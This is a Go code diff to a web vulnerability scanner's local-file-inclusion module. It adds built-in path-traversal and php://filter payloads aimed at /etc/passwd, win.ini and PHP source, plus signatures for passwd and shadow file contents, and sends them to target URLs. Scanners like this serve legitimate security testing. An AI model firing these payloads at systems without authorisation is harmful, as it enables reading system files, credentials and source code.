@@ -1,35 +1,213 @@
 package scanner
 
 import (
+	"bugx/pkg/utils"
+	"crypto/rand"
+	"encoding/hex"
 	"fmt"
-	"loxs/pkg/utils"
 	"strings"
 	"sync"
 )
 
 type LFIScanner struct{}
 
+// File signatures that CONFIRM LFI - from LFISuite/dotdotpwn
+var fileSignatures = map[string]struct {
+	Patterns []string
+	OS       string
+	File     string
+}{
+	"etc_passwd": {
+		Patterns: []string{
+			"root:x:0:0:",
+			"root:*:0:0:",
+			"daemon:x:1:1:",
+			"bin:x:2:2:",
+			"nobody:x:",
+			"/bin/bash",
+			"/bin/sh",
+			"/sbin/nologin",
+		},
+		OS:   "Linux",
+		File: "/etc/passwd",
+	},
+	"etc_shadow": {
+		Patterns: []string{
+			"root:$",
+			"root:!:",
+			"root:*:",
+			"daemon:*:",
+		},
+		OS:   "Linux",
+		File: "/etc/shadow",
+	},
+	"win_ini": {
+		Patterns: []string{
+			"[fonts]",
+			"[extensions]",
+			"[mci extensions]",
+			"for 16-bit app support",
+			"[Mail]",
+			"[files]",
+		},
+		OS:   "Windows",
+		File: "C:\\Windows\\win.ini",
+	},
+	"win_hosts": {
+		Patterns: []string{
+			"127.0.0.1",
+			"localhost",
+			"# Copyright",
+		},
+		OS:   "Windows",
+		File: "C:\\Windows\\System32\\drivers\\etc\\hosts",
+	},
+	"php_source": {
+		Patterns: []string{
+			"<?php",
+			"<?=",
+			"function ",
+			"class ",
+			"$_GET",
+			"$_POST",
+			"include(",
+			"require(",
+		},
+		OS:   "Any",
+		File: "PHP Source Code",
+	},
+}
+
+// LFI payloads targeting known files
+var lfiPayloads = []struct {
+	Payload      string
+	TargetFile   string
+	SignatureKey string
+}{
+	// Linux /etc/passwd
+	{"../../../etc/passwd", "/etc/passwd", "etc_passwd"},
+	{"....//....//....//etc/passwd", "/etc/passwd", "etc_passwd"},
+	{"..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd", "etc_passwd"},
+	{"..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd", "etc_passwd"},
+	{"/etc/passwd", "/etc/passwd", "etc_passwd"},
+	{"....//....//....//....//etc/passwd", "/etc/passwd", "etc_passwd"},
+	{"..\\..\\..\\etc\\passwd", "/etc/passwd", "etc_passwd"},
+	{"/etc/passwd%00", "/etc/passwd", "etc_passwd"},
+	{"../../../etc/passwd%00.jpg", "/etc/passwd", "etc_passwd"},
+
+	// Windows win.ini
+	{"..\\..\\..\\windows\\win.ini", "win.ini", "win_ini"},
+	{"....//....//....//windows/win.ini", "win.ini", "win_ini"},
+	{"C:\\Windows\\win.ini", "win.ini", "win_ini"},
+	{"/windows/win.ini", "win.ini", "win_ini"},
+	{"..%5c..%5c..%5cwindows%5cwin.ini", "win.ini", "win_ini"},
+
+	// PHP wrappers (for source disclosure)
+	{"php://filter/convert.base64-encode/resource=index.php", "PHP Source", "php_source"},
+	{"php://filter/read=convert.base64-encode/resource=../index.php", "PHP Source", "php_source"},
+	{"php://filter/convert.base64-encode/resource=config.php", "PHP Source", "php_source"},
+}
+
 func (s *LFIScanner) Scan(config ScanConfig) []ScanResult {
 	var processor ResultProcessor
 	var wg sync.WaitGroup
 	sem := make(chan struct{}, config.Threads)
 
-	fmt.Println(utils.Yellow("\n[i] Starting Advanced LFI Scan (Wrappers, NullByte, Dual OS)..."))
+	fmt.Println(utils.Yellow("\n[i] Starting LFI Scan (LFISuite-style verification)..."))
+	fmt.Println(utils.White("[*] Verifying by checking actual file content signatures"))
+	fmt.Println(utils.White("[*] Only CONFIRMED file inclusions will be reported\n"))
 
-	// Indicators (Key strings that confirm LFI)
-	indicators := []string{
-		"root:x:0:0:",
-		"[fonts]",
-		"[extensions]",
-		"for 16-bit app support",
-		"boot loader",
-		"failed to open stream", // PHP Error
-		"Warning: include(",
-		"Warning: require(",
-	}
+	// Generate unique canary for false positive detection
+	canaryBytes := make([]byte, 8)
+	rand.Read(canaryBytes)
+	canary := hex.EncodeToString(canaryBytes)
 
 	for _, url := range config.URLs {
-		for _, payload := range config.Payloads {
+		// Get baseline
+		baseline, err := utils.MakeRequest(url+"test_nonexistent_"+canary, config.Cookie, config.Timeout)
+		if err != nil {
+			continue
+		}
+
+		// Use built-in payloads + user payloads
+		payloadsToTest := lfiPayloads
+
+		for _, lfiPayload := range payloadsToTest {
+			wg.Add(1)
+			sem <- struct{}{}
+			go func(url string, payload struct {
+				Payload      string
+				TargetFile   string
+				SignatureKey string
+			}) {
+				defer wg.Done()
+				defer func() { <-sem }()
+
+				targetURL := url + payload.Payload
+				resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
+				if err != nil {
+					return
+				}
+
+				// Check if response is different from baseline (not 404/error page)
+				if len(resp.Body) < 50 || len(resp.Body) == len(baseline.Body) {
+					return
+				}
+
+				// Verify with file signatures
+				sig, exists := fileSignatures[payload.SignatureKey]
+				if !exists {
+					return
+				}
+
+				matchedPatterns := 0
+				for _, pattern := range sig.Patterns {
+					if strings.Contains(resp.Body, pattern) {
+						matchedPatterns++
+					}
+				}
+
+				// Need at least 2 pattern matches for confirmation
+				if matchedPatterns >= 2 {
+					fmt.Printf("%s %s\n",
+						utils.Red("[✓] LFI CONFIRMED:"),
+						utils.Cyan(truncateURL(targetURL, 90)))
+					fmt.Printf("    → File: %s (%s), Matched patterns: %d\n",
+						utils.Yellow(sig.File),
+						utils.White(sig.OS),
+						matchedPatterns)
+
+					processor.Add(ScanResult{
+						URL:        targetURL,
+						Vulnerable: true,
+						Payload:    payload.Payload,
+						Details:    fmt.Sprintf("LFI - %s file included (%s)", sig.File, sig.OS),
+					})
+				}
+
+				// Special check for PHP base64 wrapper
+				if payload.SignatureKey == "php_source" {
+					// Check for base64 encoded PHP
+					if isBase64PHPSource(resp.Body) {
+						fmt.Printf("%s %s\n",
+							utils.Red("[✓] LFI CONFIRMED (PHP Source Disclosure):"),
+							utils.Cyan(truncateURL(targetURL, 90)))
+						fmt.Printf("    → Base64 encoded PHP source code detected\n")
+
+						processor.Add(ScanResult{
+							URL:        targetURL,
+							Vulnerable: true,
+							Payload:    payload.Payload,
+							Details:    "LFI - PHP source code disclosure via php://filter",
+						})
+					}
+				}
+
+			}(url, lfiPayload)
+		}
+
+		// Also test user-provided payloads
+		for _, userPayload := range config.Payloads {
 			wg.Add(1)
 			sem <- struct{}{}
 			go func(url, payload string) {
@@ -38,47 +216,90 @@ func (s *LFIScanner) Scan(config ScanConfig) []ScanResult {
 
 				targetURL := url + payload
 				resp, err := utils.MakeRequest(targetURL, config.Cookie, config.Timeout)
-
 				if err != nil {
 					return
 				}
 
-				isVuln := false
-				details := ""
+				// Check all file signatures
+				for sigKey, sig := range fileSignatures {
+					if sigKey == "php_source" {
+						continue // Skip PHP source for user payloads
+					}
 
-				// Standard Indicator Check
-				for _, indicator := range indicators {
-					if strings.Contains(resp.Body, indicator) {
-						isVuln = true
-						details = fmt.Sprintf("Found indicator: %s", indicator)
-						break
+					matchedPatterns := 0
+					for _, pattern := range sig.Patterns {
+						if strings.Contains(resp.Body, pattern) {
+							matchedPatterns++
+						}
+					}
+
+					if matchedPatterns >= 2 {
+						fmt.Printf("%s %s\n",
+							utils.Red("[✓] LFI CONFIRMED:"),
+							utils.Cyan(truncateURL(targetURL, 90)))
+						fmt.Printf("    → File: %s (%s), Matched patterns: %d\n",
+							utils.Yellow(sig.File),
+							utils.White(sig.OS),
+							matchedPatterns)
+
+						processor.Add(ScanResult{
+							URL:        targetURL,
+							Vulnerable: true,
+							Payload:    payload,
+							Details:    fmt.Sprintf("LFI - %s file included (%s)", sig.File, sig.OS),
+						})
+						return
 					}
 				}
-
-				// Special check for Base64 wrapper
-				// If the user payload contains base64 wrapper keywords, check for base64 output
-				if strings.Contains(payload, "base64-encode") {
-					// Check if body looks like base64
-					if utils.RegexMatch(`^[A-Za-z0-9+/=]{20,}$`, resp.Body) || strings.Contains(resp.Body, "PD9w") { // PD9w is <?p in b64
-						isVuln = true
-						details = "Base64 encoded source code returned"
-					}
-				}
-
-				if isVuln {
-					fmt.Printf("%s %s %s\n", utils.Green("[✓] Vulnerable:"), utils.Cyan(targetURL), utils.Yellow("- "+details))
-					processor.Add(ScanResult{
-						URL:          targetURL,
-						Vulnerable:   true,
-						Payload:      payload,
-						ResponseTime: resp.Duration,
-						Details:      details,
-					})
-				}
-			}(url, payload)
+			}(url, userPayload)
 		}
 	}
 
 	wg.Wait()
+	printLFISummary(processor.Results)
 	return processor.Results
+}
+
+// isBase64PHPSource checks if the response contains base64-encoded PHP
+func isBase64PHPSource(body string) bool {
+	// Base64 patterns that indicate PHP source
+	phpBase64Indicators := []string{
+		"PD9waHA", // <?php
+		"PD89",    // <?=
+		"Pz4=",    // ?>
+	}
+
+	for _, indicator := range phpBase64Indicators {
+		if strings.Contains(body, indicator) {
+			return true
+		}
+	}
+	return false
+}
+
+func printLFISummary(results []ScanResult) {
+	linux, windows, php := 0, 0, 0
+	for _, r := range results {
+		if strings.Contains(r.Details, "Linux") {
+			linux++
+		} else if strings.Contains(r.Details, "Windows") {
+			windows++
+		} else if strings.Contains(r.Details, "PHP") {
+			php++
+		}
+	}
+
+	fmt.Println(utils.Yellow("\n--------------------------------------------------"))
+	fmt.Println(utils.White("LFI Scan Summary:"))
+	fmt.Printf("  %s Linux files: %d\n", utils.Red("●"), linux)
+	fmt.Printf("  %s Windows files: %d\n", utils.Red("●"), windows)
+	fmt.Printf("  %s PHP source disclosure: %d\n", utils.Red("●"), php)
+	fmt.Printf("  %s Total CONFIRMED: %d\n", utils.Green("★"), len(results))
+	fmt.Println(utils.Yellow("--------------------------------------------------"))
+
+	if len(results) > 0 {
+		fmt.Println(utils.Green("\n[!] All findings are VERIFIED - actual file content confirmed!"))
+	} else {
+		fmt.Println(utils.Yellow("\n[i] No confirmed LFI vulnerabilities found."))
+	}
 }
